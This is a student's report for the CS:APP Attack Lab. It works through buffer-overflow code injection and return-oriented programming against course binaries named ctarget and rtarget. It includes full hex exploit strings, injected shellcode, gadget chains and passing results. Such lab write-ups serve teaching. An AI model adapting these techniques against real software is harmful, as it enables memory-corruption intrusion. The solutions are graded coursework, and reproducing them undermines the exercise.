# Attack Lab Report 23307110192 朱文凯

---

- [1. Process](#1-process)
    - [1.1. Tools](#11-tools)
        - [1.1.1. hex2raw](#111-hex2raw)
        - [1.1.2. gcc and objdump](#112-gcc-and-objdump)
- [2. Part I : Code Injection Attacks](#2-part-i--code-injection-attacks)
    - [2.1. Level 1](#21-level-1)
        - [2.1.1. Process Record](#211-process-record)
    - [2.2. Level 2](#22-level-2)
        - [2.2.1. Attempt Thoughts](#221-attempt-thoughts)
        - [2.2.2. Process Record](#222-process-record)
    - [2.3. Level 3](#23-level-3)
        - [2.3.1. Attempt Thoughts](#231-attempt-thoughts)
        - [2.3.2. Process Record](#232-process-record)
- [3. Part II : Return-oriented Programming(ROP) Attacks](#3-part-ii--return-oriented-programmingrop-attacks)
    - [3.1. Level 2](#31-level-2)
        - [3.1.1. Gadget Note](#311-gadget-note)
        - [3.1.2. Attempt Thoughts](#312-attempt-thoughts)
        - [3.1.3. Process Record](#313-process-record)
    - [3.2. Level 3](#32-level-3)
        - [3.2.1. Attempt Thoughts](#321-attempt-thoughts)
        - [3.2.2. Process Record](#322-process-record)

---

## 1. Process

- `ctarget` : Code Injection Attacks  
- `rtarget` : Return-oriented Programming(ROP) Attacks  

### 1.1. Tools

#### 1.1.1. hex2raw

`hex2raw` : read hex and convert them to raw ascii  
support c style block comment  
` /* */ `(remember to leave space around both `/*` and `*/`)  

**usage:**  

1. pipe  

    ```bash
    cat answer_file | ./hex2raw | ./ctarget
    ```

2. raw file

    ```bash
    ./hex2raw < answer_file > answer_file_raw
    ./ctarget < answer_file_raw
    ```

    gdb is also supported this way  

    ```bash
    gdb ctarget  
    run < answer_file_raw  
    ```

#### 1.1.2. gcc and objdump

we can use gcc as assembler to translate our assembly code to machine code  
and then use `objdump -d` to disassemble the machine code to assembly code  
then we can get the byte codes  

## 2. Part I : Code Injection Attacks

CI Attack is used to conquer this target  

important goal : exploit string  

### 2.1. Level 1

Phase 1  
not inject new code  
but exploit string to redirect the program to execute an existing procedure  

#### 2.1.1. Process Record

1. disassemble `ctarget`  

2. find the target  

    find `stable_lunch`  
    witch uses `lunch`  
    witch uses `test`  
    witch uses `getbuf`  
    witch is our target  

    ```asm
    00000000004018fb <test>:
    4018fb:	48 83 ec 08          	sub    $0x8,%rsp
    4018ff:	b8 00 00 00 00       	mov    $0x0,%eax
    401904:	e8 31 fe ff ff       	call   40173a <getbuf>
    401909:	89 c2                	mov    %eax,%edx
    40190b:	be c8 2f 40 00       	mov    $0x402fc8,%esi
    401910:	bf 01 00 00 00       	mov    $0x1,%edi
    401915:	b8 00 00 00 00       	mov    $0x0,%eax
    40191a:	e8 01 f4 ff ff       	call   400d20 <__printf_chk@plt>
    40191f:	48 83 c4 08          	add    $0x8,%rsp
    401923:	c3                   	ret

    000000000040173a <getbuf>:
    40173a:	48 83 ec 28          	sub    $0x28,%rsp
    40173e:	48 89 e7             	mov    %rsp,%rdi
    401741:	e8 7e 02 00 00       	call   4019c4 <Gets>
    401746:	b8 01 00 00 00       	mov    $0x1,%eax
    40174b:	48 83 c4 28          	add    $0x28,%rsp
    40174f:	c3                   	ret

    00000000004019c4 <Gets>:
    4019c4:	41 54                	push   %r12
    4019c6:	55                   	push   %rbp
    4019c7:	53                   	push   %rbx
    4019c8:	49 89 fc             	mov    %rdi,%r12
    4019cb:	c7 05 4f 37 20 00 00 	movl   $0x0,0x20374f(%rip)        # 605124 <gets_cnt>
    4019d2:	00 00 00 
    4019d5:	48 89 fb             	mov    %rdi,%rbx
    4019d8:	eb 11                	jmp    4019eb <Gets+0x27>
    4019da:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
    4019de:	88 03                	mov    %al,(%rbx)
    4019e0:	0f b6 f8             	movzbl %al,%edi
    4019e3:	e8 3c ff ff ff       	call   401924 <save_char>
    4019e8:	48 89 eb             	mov    %rbp,%rbx
    4019eb:	48 8b 3d fe 2a 20 00 	mov    0x202afe(%rip),%rdi        # 6044f0 <infile>
    4019f2:	e8 f9 f2 ff ff       	call   400cf0 <_IO_getc@plt>
    4019f7:	83 f8 ff             	cmp    $0xffffffff,%eax
    4019fa:	74 05                	je     401a01 <Gets+0x3d>
    4019fc:	83 f8 0a             	cmp    $0xa,%eax
    4019ff:	75 d9                	jne    4019da <Gets+0x16>
    401a01:	c6 03 00             	movb   $0x0,(%rbx)
    401a04:	b8 00 00 00 00       	mov    $0x0,%eax
    401a09:	e8 6e ff ff ff       	call   40197c <save_term>
    401a0e:	4c 89 e0             	mov    %r12,%rax
    401a11:	5b                   	pop    %rbx
    401a12:	5d                   	pop    %rbp
    401a13:	41 5c                	pop    %r12
    401a15:	c3                   	ret 
    ```

3. edit exploit string  
    1. get the address of `touch1`  
        here it is `0x0000000000401750`  
    2. analyze the stack of `getbuf`  
        it is `0x28` bytes  
    3. so we put `0x28` bytes of junk at first  
    4. converted the address to little endian  
        `0x0000000000401750` -> `50 17 40 00 00 00 00 00`  

4. deploy the exploit string  
    1. use `hex2raw` to convert the hex string to raw ascii  
    2. run `ctarget` with the raw ascii  

5. record  

    ```txt
    Cookie: 0x72dfe7ad
    Type string:Touch1!: You called touch1()
    Valid solution for level 1 with target ctarget
    PASS: Sent exploit string to server to be validated.
    NICE JOB!
    ```

### 2.2. Level 2

Phase 2  
we start to inject a small amount of codes as part of our exploit string  

important function:  

`touch2`  

it needs an argument: `unsigned val`  
witch will be compared with my cookie  
if equal, and we did it success  

#### 2.2.1. Attempt Thoughts

1. still use the bug of `getbuf`  
2. insert some instruction to do two thing  
    1. part1 : inserted code  
        1. push the address of `touch2`  
        2. set the `%rdi` wich cookie value  
        3. use ret to call `touch2`  
    2. part2 : fill meaningless values  
    3. part3 : overwrite the ret addr of `getbuf`  
        use the starting address of the inserted code  

#### 2.2.2. Process Record

1. use gdb to run `ctarget` to find the the position of the stack used as buffer  

    ```bash
    gdb ctarget
    (gdb) b getbuf
    (gdb) r
    (gdb) i r
    ```

    result : rsp 0x5565d408  
    it's the top of the stack part of the buffer  

2. find the address of `touch2`  
    easy, not mentioned here  

3. edit the inserted code  

    1. edit phase2.s

        ```asm
        pushq $0x000000000040177c
        movl $0x72dfe7ad, %edi
        ret
        ```

    2. get the machine number code of the inserted code  

        ```bash
        gcc -c phase2.s
        objdump -d phase2.o > phase2disas.asm
        ```

        get assembly code

        ```asm
        phase2.o：     文件格式 elf64-x86-64


        Disassembly of section .text:

        0000000000000000 <.text>:
        0:	68 7c 17 40 00       	push   $0x40177c
        5:	bf ad e7 df 72       	mov    $0x72dfe7ad,%edi
        a:	c3                   	ret
        ```

4. edit the exploit string and  
    use `hex2raw` to convert the hex string to raw ascii  

    phase2 :  

    ```txt
    68 7c 17 40 00 /*         pushq   0x40177c            */ 
    bf ad e7 df 72 /*               movl    0x72dfe7ad, %edi    */ 
    c3 /*                           ret                         */ 
    68 68 68 68 68 68 68 68 
    68 68 68 68 68 68 68 68 
    68 68 68 68 68 68 68 68 
    68 68 68 68 68 /*               meaningless sled value */ 
    08 d4 65 55 00 00 00 00 /*      overwrite original ret addr with 0x5565d408(point to inserted code) */ 
    ```

5. deploy the exploit string  

6. record  

    ```txt
    Cookie: 0x72dfe7ad
    Type string:Touch2!: You called touch2(0x72dfe7ad)
    Valid solution for level 2 with target ctarget
    PASS: Sent exploit string to server to be validated.
    NICE JOB!
    ```

### 2.3. Level 3

according to the analyze of the touch3  
we can seemingly understand that what we should do here is  

1. insert the hex of cookie as string  
2. get the address of the string  
3. pass the address to `touch3`(in `%rdi`)  

#### 2.3.1. Attempt Thoughts

most steps the same with level 2  
here we only mention the important part  

1. how to insert string?  
    translate the string to hex  

2. how to terminate the string?  
    and we can find we can't insert '\0'  

    so we choose use instruction to insert '0x00' after the string  
    to terminate the string

#### 2.3.2. Process Record

1. find address of `touch3`  
2. program the instructions  

    ```asm
    pushq $0x000000000040188d
    movabs $0x5565d438, %rdi
    movb $0x00, 8(%rdi)
    ret
    ```

3. translate into machine code  
    *actually something confusing happens here*  
    *firstly, I try to put the string between the instructions and the ret addr of 'getbuf'*  
    *but, the string will be override by following invoking of functions*  
    *so, finally I put the string after the ret addr*  

    ```txt
    68 8d 18 40 00 /*           pushq $0x000000000040188d   # the address of touch3 */ 
    48 bf 38 d4 65 55 00 00
    00 00 /*                    movabs $0x5565d438, %rdi    # pass the address of the string as the touch3 param */ 
    c6 47 08 00 /*              movb $0x00, 8(%rdi)         # insert '\0' to terminate the string */ 
    c3 /*                       ret                         # instructions total 20 bytes */ 
    68 68 68 68 68 68 68 68
    68 68 68 68 68 68 68 68
    68 68 68 68 /*              meaningless values to fill the buffer */ 
    08 d4 65 55 00 00 00 00 /*  overwrite the ret addr of getbuf with 0x5565d408 */ 
    37 32 64 66 65 37 61 64 /*  0x72dfe7ad translated to ascii (should be treated as char array) */ 
    ```

    another way:  

    ```txt
    68 8d 18 40 00 /*           pushq $0x000000000040188d   # the address of touch3 */ 
    48 bf 38 d4 65 55 00 00
    00 00 /*                    movabs $0x5565d438, %rdi    # pass the address of the string as the touch3 param */ 
    c3 /*                       ret                         # instructions total 20 bytes */ 
    68 68 68 68 68 68 68 68
    68 68 68 68 68 68 68 68
    68 68 68 68 68 68 68 68 /*  meaningless values to fill the buffer */ 
    08 d4 65 55 00 00 00 00 /*  overwrite the ret addr of getbuf with 0x5565d408 */ 
    37 32 64 66 65 37 61 64 /*  0x72dfe7ad translated to ascii (should be treated as char array) */ 
    ```

4. deploy the exploit string  

5. record  

    ```txt
    Type string:Touch3!: You called touch3("72dfe7ad")
    Valid solution for level 3 with target ctarget
    PASS: Sent exploit string to server to be validated.
    NICE JOB!
    ```

**Summary:**  

`0x00` can't be inserted in the string directly  
(except for it is in the instructions)  
maybe  

all right, there is actually no this problem  
the problem may actually caused by  
the stack contains exploit string overwritten by procedure invoking  

## 3. Part II : Return-oriented Programming(ROP) Attacks

`rtarget` uses randomization and nonexecutable stack to protect itself from CI attack  
so CI is truly hard to perform to it  

ROP is not similar to CI to insert our own code  
but try to make fully use of the existing code  
witch can avoid the protection listed above  

### 3.1. Level 2

Phase 4  
target: the same with phase 2  
bug using gadgets from gadget farm  

#### 3.1.1. Gadget Note

1. `movq` instructions  
    start witch 2 bytes: `48 89`  
    the 3rd byte determine the source and destination registers  

2. `popq` instructions  
    just only 1 byte  
    start from `58`  
    correspond to one register in sequence one by one  
    `58` : `%rax`  
    `59` : `%rcx`  
    `5a` : `%rdx`  
    `5b` : `%rbx`  
    `5c` : `%rsp`  
    `5d` : `%rbp`  
    `5e` : `%rsi`  
    `5f` : `%rdi`  

3. `movl` instructions  
    start with 1 byte: `89`  
    the 2nd byte determine the source and destination registers  

4. 2-byte functional nop(no operation) instructions  
    `andb`  
    `orb`  
    `cmpb`  
    `testb`  

5. `ret`: c3  

6. `nop`: `90`  
    it is just used to increment the PC  
    without any side effect  

#### 3.1.2. Attempt Thoughts

have overall understanding of what we want to do  

1. set `%rdi`  
2. get to `touch2`  

then start to find what gadget we can use  

we find to gadget1:  

1. `popq %rax`  
2. `movl %eax, %edi`  

and then we can start to exit the exploit string  

it will be filled with several part:  

1. stuff used to fill the buffer  
2. addr of the gargets  
3. data to be used  

#### 3.1.3. Process Record

1. find the address of `touch2`  

2. find the address of gadgets  

    we can use partial search tool  
    to find the gadgets we need  

3. edit the exploit string  

    ```txt
    68 68 68 68 68 68 68 68
    68 68 68 68 68 68 68 68
    68 68 68 68 68 68 68 68
    68 68 68 68 68 68 68 68
    68 68 68 68 68 68 68 68 /* 0x28 filling values */ 
    47 19 40 00 00 00 00 00 /* ret to gadget1 0x0000000000401947 */ 
    ad e7 df 72 68 68 68 68 /* the value to be popped to %rax 0x0000000072dfe7ad */ 
    40 19 40 00 00 00 00 00 /* ret to gadget2 0x0000000000401940 */ 
    7c 17 40 00 00 00 00 00 /* ret to touch2 0x000000000040177c */ 
    ```

4. employ the exploit string  

5. record  

    ```txt
    Cookie: 0x72dfe7ad
    Type string:Touch2!: You called touch2(0x72dfe7ad)
    Valid solution for level 2 with target rtarget
    PASS: Sent exploit string to server to be validated.
    NICE JOB!
    ```

### 3.2. Level 3

#### 3.2.1. Attempt Thoughts

very complicated  

in a word, find all the gadgets  
and make fully use of it  

and there is some thing we can use directly  
*add_xy*  
we should not miss it  

and because of the randomization  
we can't hard code the address of the string we want  
so we use offset and other address to denote it indirectly  

#### 3.2.2. Process Record

1. find useful gadgets  

    ```txt
    40193a gadget : movq %rax, %rdi
    40193b gadget : movl %edx, %edi
    40193f gadget : movq %rax, %rdi
    401940 gadget : movl %edx, %edi
    401947 gadget : popq %rax
    401953 gadget : popq %rax
    40196a gadget : movq %rsp, %rax
    40196b gadget : movl %esp, %eax
    40197a gadget : movl %ecx, %esi
    40199c gadget : nop
    4019a1 gadget : movl %eax, %edx
                    orb  %al, %al
    4019bc gadget : movq %rsp, %rax
                    nop
    4019bd gadget : movl %esp, %eax
                    nop
    4019c5 gadget : testb %cl, %cl
    4019de gadget : movl %edx, %ecx
                    testb %al, %al
    401a05 gadget : movl %eax, %edx
                    nop
    401a2d gadget : movl %edx, %ecx
                    testb %bl, %bl
    401a3a gadget : movl %ecx, %esi
                    testb %al, %al
    401964 gadget : lea (%rdi,%rsi,1), %rax
    ```

2. construct the train of ROP attack  
    1. movq %rsp, %rax  
    2. movq %rax, %rdi  
    3. pop %rax  
    4. movl %eax, %edx  
    5. movl %edx, %ecx
    6. movl %ecx, %esi  
        right now: p1 in di, pd in si  
    7. lea (%rdi,%rsi,1), %rax  
    8. movq %rax, %rdi  
    9. ret to touch3  

3. translate it to actual ROP train  
    1. (getbuf) ret : PC <-- 40196a(gadget1)  
    2. (gadget1) movq %rsp, %rax : %rax <-- pointer to the stack(p1)  
    3. (gadget1) ret : PC <-- 40193a(gadget2)  
    4. (gadget2) movq %rax, %rdi : %rdi <-- p1  
    5. (gadget2) ret : PC <-- 401947(gadget3)  
    6. (gadget3) pop %rax : %rax <-- bias(pd) between p1 and start addr of string(p2)  
    7. (gadget3) ret : PC <-- 401a05(gadget4)  
    8. (gadget4) movl %eax, %edx  
    9. (gadget4) ret : PC <-- 4019de(gadget5)  
    10. (gadget5) movl %edx, %ecx  
    11. (gadget5) ret : PC <-- 40197a(gadget6)  
    12. (gadget6) movl %ecx, %esi  
    13. (gadget6) ret : PC <-- 401964(gadget7)  
    14. (gadget7) lea (%rdi,%rsi,1), %rax : %rax <-- p2  
    15. (gadget7) ret : PC <-- 40193a(gadget8)  
    16. (gadget8) movq %rax, %rdi : %rdi <-- p2  
    17. (gadget8) ret : PC <-- 0x000000000040188d(touch3)  

4. ready to edit exploit string  

    ```txt
    68 68 68 68 68 68 68 68
    68 68 68 68 68 68 68 68
    68 68 68 68 68 68 68 68
    68 68 68 68 68 68 68 68
    68 68 68 68 68 68 68 68 /* 0x28 filling values */ 
    6a 19 40 00 00 00 00 00 /* 0x40196a  (8)  */ 
    3a 19 40 00 00 00 00 00 /* 0x40193a  (8)  */ 
    47 19 40 00 00 00 00 00 /* 0x401947  (8)  */ 
    48 00 00 00 00 00 00 00 /* 0x48      (8)  */ 
    05 1a 40 00 00 00 00 00 /* 0x401a05  (8)  */ 
    de 19 40 00 00 00 00 00 /* 0x4019de  (8)  */ 
    7a 19 40 00 00 00 00 00 /* 0x40197a  (8)  */ 
    64 19 40 00 00 00 00 00 /* 0x401964  (8)  */ 
    3a 19 40 00 00 00 00 00 /* 0x40193a  (8)  */ 
    8d 18 40 00 00 00 00 00 /* 0x000000000040188d (8)  */ 
    37 32 64 66 65 37 61 64 /* string hex ascii (8)  */ 
    00 /* string terminal (1)  */ 
    ```

5. deploy the exploit string  

6. record  

    ```txt
    Type string:Touch3!: You called touch3("72dfe7ad")
    Valid solution for level 3 with target rtarget
    PASS: Sent exploit string to server to be validated.
    NICE JOB!
    ```
